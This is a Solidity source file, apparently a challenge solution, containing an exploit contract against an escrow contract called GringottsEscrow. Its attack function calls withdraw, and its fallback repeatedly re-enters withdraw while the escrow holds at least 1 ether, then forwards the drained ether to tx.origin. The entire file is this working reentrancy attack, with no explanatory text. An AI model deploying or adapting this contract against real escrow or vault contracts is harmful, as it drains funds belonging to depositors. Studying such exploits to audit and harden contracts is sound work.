pragma solidity ^0.8.0;

contract GringottsEscrowSignature {
    function deposit(bytes32 secretHash, uint256 expiration) public payable {}

    function withdraw(string calldata secret) public {}
}

contract GringottsEscrowExploit {
    GringottsEscrowSignature public gringottsEscrow;
    string private _secret;

    constructor(address _gringottsEscrowAddress) {
        gringottsEscrow = GringottsEscrowSignature(_gringottsEscrowAddress);
    }

    fallback() external payable {
        if (address(gringottsEscrow).balance >= 1 ether) {
            gringottsEscrow.withdraw(_secret);
        } else {
            (bool sent, ) = payable(tx.origin).call{value: address(this).balance}('');
            require(sent, 'FALLBACK_SEND_ISSUE');
        }
    }

    function attack(string calldata secret) external {
        gringottsEscrow.withdraw(secret);
    }
}
